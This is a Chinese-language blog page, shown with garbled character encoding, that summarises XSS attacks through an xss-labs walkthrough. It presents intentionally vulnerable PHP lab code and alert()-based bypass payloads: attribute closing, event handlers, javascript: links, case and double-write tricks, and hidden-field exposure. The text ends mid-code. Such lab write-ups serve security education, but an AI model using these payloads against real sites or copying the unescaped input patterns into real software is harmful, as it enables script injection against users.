<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Webå®‰å…¨â€”â€”XSS | ä¸ªäººåšå®¢</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/wangdengdeng/favicon.ico">
    <meta name="description" content="ä¸ªäººåšå®¢">
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
    
    <link rel="preload" href="/wangdengdeng/assets/css/0.styles.aece1d96.css" as="style"><link rel="preload" href="/wangdengdeng/assets/js/app.3ead440b.js" as="script"><link rel="preload" href="/wangdengdeng/assets/js/6.e2e47644.js" as="script"><link rel="preload" href="/wangdengdeng/assets/js/15.c2d45576.js" as="script"><link rel="prefetch" href="/wangdengdeng/assets/js/10.1b19dda1.js"><link rel="prefetch" href="/wangdengdeng/assets/js/11.90a6197a.js"><link rel="prefetch" href="/wangdengdeng/assets/js/12.ec953b45.js"><link rel="prefetch" href="/wangdengdeng/assets/js/13.91309f29.js"><link rel="prefetch" href="/wangdengdeng/assets/js/14.46d74e6d.js"><link rel="prefetch" href="/wangdengdeng/assets/js/16.543c64f2.js"><link rel="prefetch" href="/wangdengdeng/assets/js/17.15cac768.js"><link rel="prefetch" href="/wangdengdeng/assets/js/18.90b9c462.js"><link rel="prefetch" href="/wangdengdeng/assets/js/19.fe2d4f51.js"><link rel="prefetch" href="/wangdengdeng/assets/js/2.53fca3c4.js"><link rel="prefetch" href="/wangdengdeng/assets/js/20.bfd6aebf.js"><link rel="prefetch" href="/wangdengdeng/assets/js/21.515867c5.js"><link rel="prefetch" href="/wangdengdeng/assets/js/22.5246510c.js"><link rel="prefetch" href="/wangdengdeng/assets/js/23.27aafa76.js"><link rel="prefetch" href="/wangdengdeng/assets/js/24.afd0d259.js"><link rel="prefetch" href="/wangdengdeng/assets/js/25.b06b9259.js"><link rel="prefetch" href="/wangdengdeng/assets/js/26.256455b7.js"><link rel="prefetch" href="/wangdengdeng/assets/js/27.aa0ca491.js"><link rel="prefetch" href="/wangdengdeng/assets/js/28.5e0e29c0.js"><link rel="prefetch" href="/wangdengdeng/assets/js/3.cb810e63.js"><link rel="prefetch" href="/wangdengdeng/assets/js/4.6efe2eb7.js"><link rel="prefetch" href="/wangdengdeng/assets/js/5.63f29a16.js"><link rel="prefetch" href="/wangdengdeng/assets/js/7.8704393b.js"><link rel="prefetch" href="/wangdengdeng/assets/js/8.4837a75b.js"><link rel="prefetch" href="/wangdengdeng/assets/js/9.5a7ccf82.js">
    <link rel="stylesheet" href="/wangdengdeng/assets/css/0.styles.aece1d96.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="global-layout" data-v-7f2e4136><header class="header-container" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/wangdengdeng/post-bg.jpeg);" data-v-93921ff8 data-v-7f2e4136><nav class="navbar" style="position:absolute;opacity:1;transition:all 0.5s ease-in-out;" data-v-93921ff8><a href="/wangdengdeng/" class="navbar-link router-link-active">
    
  </a> <ul class="navbar-links"><li><a href="/wangdengdeng/" class="router-link-active">
        ä¸»é¡µ
      </a></li><li><a href="/wangdengdeng/about/">
        å…³äºä½œè€…
      </a></li><li><a href="/wangdengdeng/tags/">
        æŠ€æœ¯æ ˆ
      </a></li></ul> <div id="nav-icon"><span></span><span></span><span></span></div></nav> <div class="header-title" data-v-93921ff8 data-v-93921ff8><h1 data-v-93921ff8>Webå®‰å…¨â€”â€”XSS</h1> <p data-v-93921ff8></p></div></header> <div class="container" data-v-b3fda33c data-v-7f2e4136><main class="main" style="width:60%;" data-v-b3fda33c><div class="post" data-v-b3fda33c data-v-b3fda33c><article class="main-div"><div class="post-content content content__default"><p>æœ¬ç¯‡åšå®¢ä¸»è¦æ˜¯å¯¹å¸¸è§XSSæ¼æ´çš„æ€»ç»“</p> <blockquote><p>æ³¨ï¼šç”±äºGitHubå¹³å°æœªå¯¹åšå®¢å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥æœ¬æ–‡æ‰€æœ‰xssä»£ç å‡è¿›è¡Œå¤„ç†ã€‚</p> <p>è¯·è¯»è€…è‡ªè¡Œé‰´åˆ«</p></blockquote> <h1 id="ä¸€ã€xssæ”»å‡»æ¦‚è¿°"><a href="#ä¸€ã€xssæ”»å‡»æ¦‚è¿°" class="header-anchor">#</a> ä¸€ã€XSSæ”»å‡»æ¦‚è¿°</h1> <blockquote><p><strong>ä¸€ã€ä»€ä¹ˆæ˜¯XSSæ”»å‡»</strong>
XSSæ”»å‡»ä¸­æ–‡åç§°ä¸ºï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒXSSçš„é‡ç‚¹ä¸åœ¨äºè·¨ç«™ï¼Œè€Œåœ¨äºè„šæœ¬çš„æ”»å‡»ã€‚
XSSæ”»å‡»çš„å·¥ä½œåŸç†ï¼šæ”»å‡»è€…ä¼šåœ¨webé¡µé¢ä¸­æ’å…¥ä¸€äº›æ¶æ„çš„scriptä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µé¢çš„æ—¶å€™ï¼Œé‚£ä¹ˆåµŒå¥—åœ¨è¯¥é¡µé¢çš„ä»£ç å°±ä¼šæ‰§è¡Œï¼Œå› æ­¤ä¼šè¾¾åˆ°æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚
XSSçš„åˆ†ç±»ï¼šXSSæ”»å‡»æœ€ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼Œåå°„å‹ï¼Œå­˜å‚¨å‹ï¼ŒDOM-basedå‹ã€‚åå°„å‹å’ŒDOM-basedå‹å¯ä»¥å½’ç±»äºéæŒä¹…æ€§XSSæ”»å‡»ã€‚å­˜å‚¨å‹å¯ä»¥å½’ç±»äºæŒä¹…æ€§XSSæ”»å‡»ã€‚</p></blockquote> <h1 id="äºŒã€xsså¸¸è§ç±»å‹"><a href="#äºŒã€xsså¸¸è§ç±»å‹" class="header-anchor">#</a> äºŒã€XSSå¸¸è§ç±»å‹</h1> <h2 id="åå°„å‹"><a href="#åå°„å‹" class="header-anchor">#</a> åå°„å‹:</h2> <p>â€‹		æ”»å‡»è€…å‘é€ç»™è¢«æ”»å‡»è€…ä¸€ä¸ªé‚®ä»¶ä¿¡æ¯æˆ–è€…é“¾æ¥ï¼Œå½“è¢«æ”»å‡»è€…ç‚¹å‡»å¹¶è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œæ­¤æ—¶å°±ä¼šå‘æ”»å‡»è€…çš„ç›®æ ‡æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œæ­¤æ—¶æ ¹æ®è¯·æ±‚è¿”å›ç›¸å…³çš„<code>script</code>ä»£ç ï¼Œå½“æµè§ˆå™¨è§£æè¿™äº›<code>script</code>ä»£ç æ—¶ï¼Œæ­¤æ—¶ä»£ç å°±ä¼šåœ¨æµè§ˆå™¨æ‰§è¡Œï¼Œé€ æˆç”¨æˆ·è¢«æ”»å‡»ã€‚</p> <p>xss-labsé¢˜è§£ï¼š</p> <h3 id="_1-ç›´æ¥æ¥å—è¡¨å•ä¼ è¾“çš„å€¼-æ‹¼æ¥åœ¨htmlä»£ç ä¸­æ‰§è¡Œ"><a href="#_1-ç›´æ¥æ¥å—è¡¨å•ä¼ è¾“çš„å€¼-æ‹¼æ¥åœ¨htmlä»£ç ä¸­æ‰§è¡Œ" class="header-anchor">#</a> 1.ç›´æ¥æ¥å—è¡¨å•ä¼ è¾“çš„å€¼ï¼Œæ‹¼æ¥åœ¨htmlä»£ç ä¸­æ‰§è¡Œ</h3> <p>â€‹	æ­¤æ—¶ç›´æ¥è¾“å‡ºçš„phpä»£ç å°±ä¼šæŒ‰ç…§htmlä»£ç è§£ææ‰§è¡Œï¼Œç±»æ¯”ä¸€ä¸‹ <code>echo &quot;&lt;br&gt;&quot;;</code></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h3 id="_2-ä¸€ä¸ªå‡½æ•°htmlspecialchars"><a href="#_2-ä¸€ä¸ªå‡½æ•°htmlspecialchars" class="header-anchor">#</a> 2.ä¸€ä¸ªå‡½æ•°	<strong>htmlspecialchars()</strong></h3> <h4 id="å®šä¹‰å’Œç”¨æ³•"><a href="#å®šä¹‰å’Œç”¨æ³•" class="header-anchor">#</a> å®šä¹‰å’Œç”¨æ³•</h4> <p>htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ç®€å•çš„æ¥è¯´ï¼Œ<strong>å°±æ˜¯å°†è¾“å‡ºæ—¶ä¼šäº¤ç»™è§£æçš„htmlä»£ç è½¬æ¢ä¸ºä¸å¯æ‰§è¡Œçš„å­—ç¬¦è¾“å‡º</strong>ï¼Œä»è€Œå»é¿å…xssè„šæœ¬çš„æ‰§è¡Œ</p> <p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼šï¼ˆéƒ½æˆä¸ºè‡ªå·±ï¼‰</p> <ul><li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</li> <li>&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &quot;</li> <li>' ï¼ˆå•å¼•å·ï¼‰æˆä¸º '</li> <li>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</li> <li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</li></ul> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;keyword&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;
&lt;form action=level2.php method=GET&gt;//getæäº¤æ–°è¡¨å•ï¼Œå°†strå­—ç¬¦å®ä½“å†™å…¥valueå±æ€§
&lt;input name=keyword  value=&quot;'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot;&gt;
&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;
&lt;/form&gt;
&lt;/center&gt;'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre></div><p><strong><input name="keyword" value="'.$str.'"></strong></p> <p>åœ¨è¿™é‡Œï¼Œåªè¦ç”¨è„šæœ¬å°†valueå±æ€§==é—­åˆ==ï¼Œä»è€Œä½¿è„šæœ¬ç›´æ¥æ’å…¥åœ¨htmlä»£ç ï¼ˆè¡¨å•ï¼‰ä¸­</p> <p>(<strong>==&quot;&gt;==<script>alert(/(â‰§â–½â‰¦)/)</script></strong>)</p> <p>é«˜äº®é—­åˆå±æ€§ï¼Œåé¢çš„è„šæœ¬ä¸å˜ã€‚</p> <h3 id="_3-æ·±å…¥ä¸€ä¸ªå‡½æ•°htmlspecialchars-çš„ä¼ å‚"><a href="#_3-æ·±å…¥ä¸€ä¸ªå‡½æ•°htmlspecialchars-çš„ä¼ å‚" class="header-anchor">#</a> 3.æ·±å…¥ä¸€ä¸ªå‡½æ•°htmlspecialchars()çš„ä¼ å‚ï¼š</h3> <div class="language-php extra-class"><pre class="language-php"><code><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;keyword&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value='&quot;</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;'&gt;//ä¸¤æ¬¡è¿›è¡Œå®ä½“è½¬æ¢
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre></div><p>å¯é€‰ã€‚è§„å®šå¦‚ä½•å¤„ç†å¼•å·ã€æ— æ•ˆçš„ç¼–ç ä»¥åŠä½¿ç”¨å“ªç§æ–‡æ¡£ç±»å‹ã€‚</p> <p>å¯ç”¨çš„å¼•å·ç±»å‹ï¼š</p> <ul><li>ENT_COMPAT - <strong>==é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·==</strong>ã€‚</li> <li>ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚</li> <li>ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å·ã€‚</li></ul> <p>æ•…è‹¥ç¬¬äºŒä¸ªå‚æ•°æœªè®¾ç½®ï¼Œåˆ™ä¸ä¼šè½¬æ¢==<strong>å•å¼•å·</strong>==ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨å¸¸è§„çš„**&lt;&gt;**æ ‡ç­¾ä»æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥ï¼š</p> <h5 id="ä¸€ä¸ªinputå±æ€§-onclick-é¿å¼€-çš„å®ä½“åŒ–"><a href="#ä¸€ä¸ªinputå±æ€§-onclick-é¿å¼€-çš„å®ä½“åŒ–" class="header-anchor">#</a> ä¸€ä¸ªinputå±æ€§ï¼šonclickï¼Œé¿å¼€&lt;&gt;çš„å®ä½“åŒ–</h5> <h6 id="å®šä¹‰"><a href="#å®šä¹‰" class="header-anchor">#</a> <strong>å®šä¹‰ï¼š</strong></h6> <p>onclick äº‹ä»¶åœ¨ç”¨æˆ·å•å‡»å…ƒç´ æ—¶å‘ç”Ÿã€‚</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;input onclick=alert('</span>wangdengdeng<span class="token string single-quoted-string">')&gt;'</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p>å½“å•å‡»æ–‡æœ¬æ¡†ï¼ˆinputæ— typeå±æ€§é»˜è®¤ä¸ºtextï¼‰æ—¶ï¼Œæ‰§è¡Œalertï¼Œä¸”éœ€è¦ç‚¹å‡»textæ¡†å»å®ç°ï¼Œæ­¤æ—¶alertä¸­é¡»æ”¾ç½®æ•°å­—æˆ–è€…ç”¨**/å­—ç¬¦ä¸²/**</p> <p>ç”¨==/ /==: å› ä¸º//æ„æˆäº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p> <h5 id="ç¬¬äºŒä¸ªinputå±æ€§-onfucus-å…¶å®ä¹Ÿæ˜¯é€šè¿‡å•å‡»è¾“å…¥æ¡†æ‰§è¡Œjsä»£ç "><a href="#ç¬¬äºŒä¸ªinputå±æ€§-onfucus-å…¶å®ä¹Ÿæ˜¯é€šè¿‡å•å‡»è¾“å…¥æ¡†æ‰§è¡Œjsä»£ç " class="header-anchor">#</a> ç¬¬äºŒä¸ªinputå±æ€§ï¼šonfucusï¼Œå…¶å®ä¹Ÿæ˜¯é€šè¿‡å•å‡»è¾“å…¥æ¡†æ‰§è¡Œjsä»£ç </h5> <p>è¿™é‡Œå¯ä»¥é€šè¿‡<code>&lt;input&gt;</code>æ ‡ç­¾çš„ä¸€äº›ç‰¹æ®Šäº‹ä»¶æ¥æ‰§è¡Œjsä»£ç </p> <p>æ„é€ ä»£ç ï¼š<code>level3.php?keyword='onfocus=javascript:rt('99') &gt; //&amp;submit=æœç´¢</code></p> <p>' &lt;&gt;</p> <h3 id="_4-é»‘åå•o-n-scr-iptç»•è¿‡"><a href="#_4-é»‘åå•o-n-scr-iptç»•è¿‡" class="header-anchor">#</a> 4.é»‘åå•o_n	&lt;scr_iptç»•è¿‡</h3> <p>æºç ï¼š</p> <div class="language-php extra-class"><pre class="language-php"><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
echo &quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>&quot;.'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>åšä¸€ä¸ªæ›¿æ¢ï¼Œä½¿è„šæœ¬å¤±æ•ˆ</p> <p>ç»•è¿‡æ–¹æ³•ï¼š</p> <div class="language-php+HTML extra-class"><pre class="language-text"><code>(&quot;&gt;&lt;a href=&quot;javascript:alert(/2/)&quot;&gt;alert&lt;/a&gt; &lt;&quot;)
</code></pre></div><p>å°†æ ‡ç­¾é—­åˆä¸ºï¼š</p> <div class="language-html extra-class"><pre class="language-html"><code>(value=&quot;&quot;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:alert(/admin/)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>alert<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>&quot;&quot;</span><span class="token punctuation">&gt;</span></span>//æœ€åé—­åˆ)
</code></pre></div><p>æ„ä¸ºå®šä¹‰aæ ‡ç­¾çš„è¶…é“¾æ¥</p> <h3 id="_5-å¤§å°å†™ç»•è¿‡"><a href="#_5-å¤§å°å†™ç»•è¿‡" class="header-anchor">#</a> 5.å¤§å°å†™ç»•è¿‡</h3> <p>ç»•è¿‡ï¼š(å¤§å°å†™ç»•è¿‡è¿‡æ»¤é»‘åå•çš„<strong>éƒ¨åˆ†</strong>ï¼Œ HrEfä¹Ÿå¯)</p> <div class="language-php+HTML extra-class"><pre class="language-text"><code>(&quot;&gt;&lt;a HREf=&quot;javascript:alert(/4/)&quot;&gt;alert&lt;/a&gt; &lt;&quot;)
</code></pre></div><p>å¤§å†™å‡½æ•°ï¼š</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;keyword&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="_6-åŒå†™ç»•è¿‡"><a href="#_6-åŒå†™ç»•è¿‡" class="header-anchor">#</a> 6.åŒå†™ç»•è¿‡</h3> <p>åŒå†™ç»•è¿‡çš„åŸç†æ˜¯str_replaceæ­¤å‡½æ•°å¯¹äºæ•æ„Ÿå­—ç¬¦ä¸²åªè¿›è¡Œä¸€æ¬¡æ›¿æ¢ã€‚</p> <h3 id="_7-æºç "><a href="#_7-æºç " class="header-anchor">#</a> 7.æºç ï¼š</h3> <div class="language-php+HTML extra-class"><pre class="language-text"><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);//å°å†™
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);//æ›¿æ¢ scriptã€onã€srcã€dataã€herfã€&quot;å·
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
 echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
?&gt;
&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
</code></pre></div><p>é¦–å…ˆå¯¹äº**==â€å·==<strong>è¿›è¡Œçš„è¿‡æ»¤å¯¼è‡´äº†valueæ ‡ç­¾æ— æ³•é—­åˆï¼ŒåŒå†™å°±å¤±æ•ˆäº†ã€‚å¯¼è‡´çš„ç»“æœæ˜¯æ— æ³•æ„æˆå®Œæ•´herfï¼Œæ‰€ä»¥è¿›è¡ŒURLç¼–ç ï¼ˆ<strong>Unicode</strong>ï¼‰å°†å®Œæ•´herfè½¬æ¢ä¸ºç¼–ç ,æ‰§è¡Œï¼Œææ€•åªèƒ½ç”¨äº</strong>é“¾æ¥è§£æ**ã€‚</p> <h3 id="_8-æºç "><a href="#_8-æºç " class="header-anchor">#</a> 8.æºç ï¼š</h3> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//strpos		å¯¹äºä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®è¿›è¡ŒæŸ¥æ‰¾</span>
<span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token comment">//å¸¸è§„è¿‡æ»¤ä¹‹åçš„</span>
        <span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'</span><span class="token operator">.</span><span class="token variable">$str7</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p>ç»•è¿‡ï¼šå°†alert()ä¸­æ¢ä¸ºhttp://</p> <blockquote><p>javascript: æ˜¯ä¸€ä¸ªä¼ªåè®®</p></blockquote> <blockquote><p>javascript:æ˜¯è¡¨ç¤ºåœ¨è§¦å‘<a>é»˜è®¤åŠ¨ä½œæ—¶ï¼Œæ‰§è¡Œä¸€æ®µJavaScriptä»£ç ï¼Œè€Œ javascript:; è¡¨ç¤ºä»€ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œè¿™æ ·ç‚¹å‡»<a>æ—¶å°±æ²¡æœ‰ä»»ä½•ååº”ã€‚</a></a></p></blockquote> <h3 id="_9-inputçš„æ–°å±æ€§"><a href="#_9-inputçš„æ–°å±æ€§" class="header-anchor">#</a> 9.inputçš„æ–°å±æ€§</h3> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;keyword&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//åªå‘å†…ä¼ é€’äº†ä¸¤ä¸ªå‚æ•°</span>
<span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;t_sort&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&gt;&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¯¹t_sortè¿›è¡Œæ¢ç©ºå¤„ç†ï¼ˆå¦å®šæ’å…¥&lt;&gt;ï¼‰</span>
<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&lt;&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p><strong>type</strong> <strong>hidden</strong></p> <p>å°±æ˜¯è¿›è¡Œç”¨æˆ·ä¸å¿…è¦çš„å‚æ•°ä¼ é€’ï¼Œæˆ–è€…è¯´æ—¶ä¸ºäº†ä¿æŠ¤ä¼ å‚çš„å®‰å…¨æ€§</p> <p><strong>ç»•è¿‡</strong></p> <p>å°†valueé—­åˆï¼Œåç›´æ¥åŠ typeä¸ºå¯è§çš„textï¼Œç›´æ¥å˜æˆæ–‡æœ¬æ¡†å¯è§</p> <p>(<strong>&quot; onfocus=javascript:alert(/23/) type=&quot;text&quot;</strong>)</p> <h3 id="_10-referer"><a href="#_10-referer" class="header-anchor">#</a> 10.referer:</h3> <div class="language-php extra-class"><pre class="language-php"><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
